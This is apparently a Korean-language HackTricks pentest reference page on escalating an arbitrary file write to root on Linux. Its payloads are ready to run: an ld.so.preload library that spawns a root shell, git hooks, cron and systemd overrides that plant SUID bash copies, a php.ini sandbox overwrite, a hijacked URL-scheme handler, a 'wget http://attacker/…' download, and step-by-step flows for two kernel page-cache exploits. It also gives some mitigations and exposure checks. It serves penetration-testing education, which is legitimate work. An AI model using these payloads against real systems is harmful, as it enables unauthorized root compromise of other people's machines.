# Root에 대한 임의 파일 쓰기

### /etc/ld.so.preload

`/etc/ld.so.preload`은 dynamic linker가 다른 shared objects보다 먼저 로드하는 shared objects의 system-wide 목록입니다. Secure-execution mode에서는 preloading에 추가 제한이 적용되므로 `/tmp/pe.so`와 같은 library path는 모든 SUID-binary에 적용되는 universal technique이 아닙니다.\
이를 생성하거나 수정할 수 있다면, 해당 파일을 로드하는 process는 다른 shared objects보다 먼저 목록에 지정된 library를 로드하므로 해당 process의 context에서 code execution이 가능합니다.<sup>[[12]](#references)</sup>

예: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks**는 commit 및 merge 작업을 포함하여 repository에서 이벤트가 발생할 때 실행되는 executable script입니다. **privileged script 또는 user**가 이러한 작업을 수행하고 공격자가 **`.git` 폴더에 write**할 수 있다면, 해당 hook을 **privilege escalation**에 사용할 수 있습니다.<sup>[[13]](#references)</sup>

예를 들어, 새로운 commit이 생성될 때 항상 실행되도록 git repo의 **`.git/hooks`**에 **script를 생성**할 수 있습니다:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron 및 시간 파일

root가 실행하는 **cron 관련 파일에 쓰기**가 가능하면, 일반적으로 다음 작업이 실행될 때 code execution을 얻을 수 있습니다. 흥미로운 대상은 다음과 같습니다:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` 또는 `/var/spool/cron/crontabs/`에 있는 root의 crontab
- `systemd` timers 및 해당 timers가 트리거하는 services

빠른 확인:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
일반적인 악용 경로:

- `/etc/crontab` 또는 `/etc/cron.d/`의 파일에 **새 root cron job 추가**
- `run-parts`에서 이미 실행하는 **script 교체**
- 실행되는 script 또는 binary를 수정하여 **기존 timer target에 backdoor 삽입**

최소 cron payload 예시:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts`에서 사용하는 cron 디렉터리에만 쓸 수 있다면, 대신 해당 디렉터리에 실행 가능한 파일을 배치하세요:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
참고:

- `run-parts`는 일반적으로 점이 포함된 파일명을 무시하므로 `backup.sh` 대신 `backup`과 같은 이름을 사용하는 것이 좋습니다.<sup>[[15]](#references)</sup>
- 일부 시스템은 기존 cron 대신 `systemd` timers를 사용하지만, 악용 아이디어는 동일합니다. **나중에 root가 실행할 내용을 수정하는 것**입니다.<sup>[[20]](#references)</sup>

### Service & Socket 파일

**`systemd` unit files** 또는 해당 파일에서 참조하는 파일을 write할 수 있다면, unit을 reload하고 restart하거나 service/socket activation 경로가 trigger될 때까지 기다려 root 권한으로 code execution을 수행할 수 있습니다.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

흥미로운 targets는 다음과 같습니다.

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf`의 Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`에서 참조하는 Service scripts/binaries
- root Service가 load하는 writable `EnvironmentFile=` paths

빠른 확인:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
일반적인 악용 경로:

- 수정할 수 있는 root 소유 service unit의 **`ExecStart=` 덮어쓰기**
- 악성 **`ExecStart=`**를 포함한 **drop-in override** 추가 및 먼저 기존 항목 삭제
- unit에서 이미 참조하는 script/binary에 **Backdoor** 삽입
- socket이 connection을 수신할 때 시작되는 해당 **`.service`** 파일을 수정하여 **socket-activated service** 하이재킹

악성 override 예시:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
일반적인 활성화 흐름:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
서비스를 직접 재시작할 수 없지만 socket-activated unit을 편집할 수 있다면, **클라이언트 연결을 기다리기만 해도** root 권한으로 backdoored service의 실행을 트리거할 수 있습니다.<sup>[[17]](#references)</sup>

### 권한이 높은 PHP sandbox에서 사용하는 제한적인 `php.ini` 덮어쓰기

일부 custom daemon은 **제한된 `php.ini`**(예: `disable_functions=exec,system,...`)과 함께 `php`를 실행하여 사용자가 제공한 PHP를 검증합니다. sandbox된 코드에 `file_put_contents` 같은 **write primitive**가 **하나라도** 남아 있고 daemon이 사용하는 **정확한 `php.ini` 경로**에 접근할 수 있다면, 해당 config를 **덮어써서** 제한을 해제한 다음 elevated privileges로 실행되는 두 번째 payload를 제출할 수 있습니다.<sup>[[2]](#references)</sup>

일반적인 흐름:

1. 첫 번째 payload가 sandbox config를 덮어씁니다.
2. 위험한 함수가 다시 활성화된 상태에서 두 번째 payload가 코드를 실행합니다.

최소 예제(daemon이 사용하는 경로로 교체):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
데몬이 root로 실행되거나 root 소유 경로를 사용해 검증하는 경우, 두 번째 실행은 root context를 생성합니다. 이는 sandboxed runtime이 여전히 파일을 쓸 수 있을 때 발생하는 **config overwrite를 통한 privilege escalation**입니다.

### binfmt_misc

`binfmt_misc`는 `/proc/sys/fs/binfmt_misc` 아래에 registrations를 노출하며, 각 registration은 file-type pattern을 interpreter와 연결합니다. privilege impact는 누가 registration을 변경할 수 있는지와 이후 일치하는 파일을 실행하는 process가 무엇인지에 따라 달라지므로, 이를 privilege-escalation 경로로 간주하기 전에 해당 요구 사항을 확인해야 합니다.<sup>[[21]](#references)</sup>

### Overwrite schema handlers (like http: or https:)

Desktop environments는 MIME associations와 desktop entries를 사용해 URI schemes에 사용할 application을 선택합니다. 관련 per-user configuration 및 desktop-entry directories에 쓸 수 있는 attacker는 해당 schemes를 자신이 제어하는 launcher로 redirect할 수 있습니다. `$HOME/.config/mimeapps.list` 파일을 수정해 HTTP 및 HTTPS URL handlers가 malicious file을 가리키도록 하면(예: `x-scheme-handler/http=evil.desktop` 및 `x-scheme-handler/https=evil.desktop`), user click으로 해당 desktop entry를 실행할 수 있습니다.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root가 사용자 쓰기 가능한 스크립트/바이너리를 실행하는 경우

권한 있는 workflow가 `/bin/sh /home/username/.../script`와 같은 명령을 실행하거나, 권한이 없는 사용자가 소유한 디렉터리 안의 바이너리를 실행하는 경우 이를 hijack할 수 있습니다:<sup>[[1]](#references)</sup>

- **실행 감지:** pspy로 프로세스를 모니터링하여 root가 사용자 제어 경로를 호출하는지 확인합니다.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **쓰기 가능 여부 확인:** 대상 파일과 해당 디렉터리가 모두 사용자가 소유하고 있으며 사용자에게 쓰기 권한이 있는지 확인합니다.
- **대상 하이재킹:** 원본 binary/script를 백업하고 SUID shell을 생성하는 payload(또는 다른 root 작업)를 배치한 다음 권한을 복원합니다:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (예: helper를 생성하는 UI 버튼 누르기). root가 hijacked된 경로를 다시 실행하면 `./rootshell -p`로 escalated shell을 획득합니다.

### Privileged binary의 page-cache-only file modification

일부 kernel bug는 파일을 **디스크에 직접 수정하지 않습니다**. 대신 읽을 수 있는 파일의 **page cache copy**만 수정할 수 있게 합니다. **setuid** 또는 그 밖에 **root가 실행하는** binary를 대상으로 삼을 수 있다면, 다음 실행 시 메모리에 있는 attacker-controlled bytes가 실행되어 privilege를 escalate할 수 있습니다. 디스크의 file hash는 변경되지 않은 상태입니다.<sup>[[3]](#references)[[4]](#references)</sup>

이는 **runtime-only file write primitive**로 생각하면 유용합니다:<sup>[[3]](#references)</sup>

- **Disk stays clean**: inode와 디스크상의 bytes는 변경되지 않음
- **Memory is dirty**: cached page를 읽거나 실행하는 process는 attacker-modified content를 가져옴
- **Effect is temporary**: reboot 또는 cache eviction 후 변경 사항이 사라짐

이 primitive는 classic **arbitrary file write**와 Dirty COW / Dirty Pipe 같은 과거의 **page-cache abuse** bug 사이에 있습니다:<sup>[[3]](#references)</sup>

- Dirty COW는 race에 의존함
- Dirty Pipe는 write-position 제약이 있었음
- vulnerable path가 cached file-backed pages에 직접 write를 제공한다면 page-cache-only primitive가 더 안정적일 수 있음

#### Generic privesc flow

1. **file-backed page cache pages**에 write할 수 있는 kernel primitive를 확보
2. 이를 **readable privileged binary** 또는 root가 실행하는 다른 파일에 사용
3. page가 cache에서 eviction되기 **전에** execution을 trigger
4. 디스크상의 파일은 수정되지 않은 것처럼 보이는 상태에서 root로 code execution 획득

일반적인 high-value target:

- **setuid-root** binaries
- **root services**가 launch하는 helpers
- host kernel/page cache를 공유하는 **containers**에서 일반적으로 실행되는 binaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431)은 이 class의 좋은 example입니다. vulnerable path는 Linux crypto userspace API (`AF_ALG` / `algif_aead`)에 있었습니다:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`는 readable file의 page-cache pages에 대한 references를 crypto TX scatterlist로 이동할 수 있음
- in-place `algif_aead` decrypt path는 source와 destination buffers를 재사용함
- 이후 `authencesn`이 destination tag region에 write함
- 해당 region이 여전히 spliced file-backed pages를 참조하고 있으면 write가 **target file의 page cache**에 적용됨

따라서 중요한 technique은 CVE 자체가 아니라 다음 pattern입니다.

- **file-backed cache pages를 kernel subsystem에 전달**
- subsystem이 이를 **writable output으로 취급하도록 함**
- memory에서 작고 제어 가능한 overwrite를 trigger

Public PoC는 반복적인 **4-byte writes**를 사용해 `/usr/bin/su`를 memory에서 patch한 다음 이를 실행했습니다.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503)은 이번에는 `AF_ALG` 대신 sink가 **IPsec ESP decrypt**인, 동일한 **page-cache-only write-to-root** pattern의 또 다른 variant를 보여줍니다.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

중요한 technique은 **metadata-laundering step**입니다.

- `splice()`는 **read-only file-backed page-cache page**를 ESP-in-UDP packet에 배치함
- 기존 DirtyFrag mitigation은 해당 skb에 `SKBFL_SHARED_FRAG`를 tag하여 `esp_input()`이 decrypt 전에 **copy하도록** 함
- netfilter `TEE`는 `nf_dup_ipv4()` -> `__pskb_copy_fclone()`을 통해 packet을 duplicate함
- clone은 동일한 **physical page-cache reference**를 유지하지만 `SKBFL_SHARED_FRAG`를 잃음
- 이후 `esp_input()`은 clone을 safe한 것으로 취급하고 file-backed page에서 **in-place `cbc(aes)` decrypt**를 실행함

따라서 reviewer가 얻어야 할 교훈은 CVE보다 더 광범위합니다. operation을 먼저 copy해야 하는지 결정하는 데 **skb/page metadata**에 의존하는 mitigation이라면, backing page는 유지하면서 metadata를 제거하는 **clone/copy path**가 write primitive를 조용히 다시 열 수 있습니다.

일반적인 exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`를 사용해 **private network namespace 내부에서 `CAP_NET_ADMIN`**을 획득
2. loopback을 올리고 `mangle/OUTPUT`에 **netfilter `TEE` rule**을 설치
3. `NETLINK_XFRM`을 통해 **XFRM ESP transport SAs**를 설치
4. 각 target 4-byte word를 SA `seq_hi` field에 encode (DirtyFrag의 word-selection trick)
5. spliced ESP-in-UDP packet을 전송하여 **TEE clone**이 `esp_input()`에 도달하고 **in place**로 decrypt하도록 함
6. `/usr/bin/su` 또는 다른 privileged executable의 page-cache copy에 attacker-controlled code가 포함될 때까지 반복

Operational impact는 `AF_ALG` example과 동일합니다. 디스크상의 파일은 clean 상태로 유지되지만 `execve()`가 **mutated page-cache bytes**를 사용하여 root를 제공합니다.<sup>[[8]](#references)[[9]](#references)</sup>

이 variant에 유용한 exposure checks:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
여기서 단기적인 attack-surface reduction도 경로별로 적용됩니다. `48f6a5356a33`을 포함하는 kernel로 업그레이드하면 clone path가 수정되고, `xt_TEE` autoload를 차단하면 **flag-laundering step**이 제거되며, `esp4` / `esp6`를 차단하면 **decrypt sink**가 제거됩니다.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### 노출 및 hunting

이러한 종류의 bug가 의심된다면 disk integrity checks에만 의존하지 마세요. 다음도 verify하세요:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
아래 configuration 값은 loadable interface와 kernel에 built-in된 interface를 구분합니다. crypto build rules는 `CONFIG_CRYPTO_USER_API_AEAD`를 `algif_aead`에 매핑합니다.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead`를 module로 load/unload할 수 있음
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface가 kernel에 built-in됨
- setuid binaries는 좋은 target입니다. page-cache-only patch만으로도 local foothold를 root로 전환할 수 있기 때문입니다.

#### `algif_aead` path에 대한 attack-surface reduction

vulnerable interface가 loadable module로 제공되는 경우:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
커널에 컴파일되어 있는 경우, 일부 disclosure에서는 다음과 같이 init 경로를 차단한다고 보고했습니다:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
이러한 종류의 완화책은 다른 kernel LPE에도 기억해 둘 가치가 있습니다. exploitation이 특정 optional interface에 의존하는 경우, 전체 kernel upgrade를 적용하기 전에도 해당 interface를 비활성화하거나 blacklisting하면 exploit 경로를 차단할 수 있습니다.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – user-writable PaperCut 디렉터리에서 root가 실행하는 스크립트 hijacking](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431에 대한 Openwall oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place 작동으로 Revert](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE variant DirtyClone (CVE-2026-43503) 분석 및 exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()`에서 `SKBFL_SHARED_FRAG` 보존 (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: spliced UDP packet에 `SKBFL_SHARED_FRAG` 설정 (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian 매뉴얼 페이지](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
